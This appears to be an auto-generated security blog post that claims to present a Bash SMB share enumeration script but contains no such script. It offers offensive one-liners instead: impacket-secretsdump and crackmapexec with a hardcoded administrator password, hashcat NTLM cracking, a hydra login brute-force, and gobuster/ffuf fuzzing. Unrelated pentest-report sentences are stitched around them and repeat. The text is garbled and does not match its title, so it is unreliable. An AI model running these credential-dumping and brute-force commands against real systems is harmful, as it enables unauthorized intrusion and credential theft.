---
TitleSEO: "SMB Share Enumeration Script in Bash | ZureFX"
TitlePost: "SMB Share Enumeration Script — Bash"
Author: "ZureFX"
Description: "A Bash script for smb share enumeration script. Built for security research and automation."
Keywords: "tool, scanner, rust, parser, powershell, c, bash"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-956.html"
URL_IMAGES: ""
Date: "2024-07-20"
Tags: "Tool, Scanner, Rust, Parser, PowerShell, C, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-956"
Permalink: "/scripting/script-smb-share-enumeration-script-956.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `psexec`
- `smbclient`
- `sharphound`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```bash
gobuster dir -u http://10.81.113.146/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.60.23.6
crackmapexec smb 10.122.9.96 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.240.83
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.49.168
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.194.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.46.55.65/FUZZ
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 8.09s
```
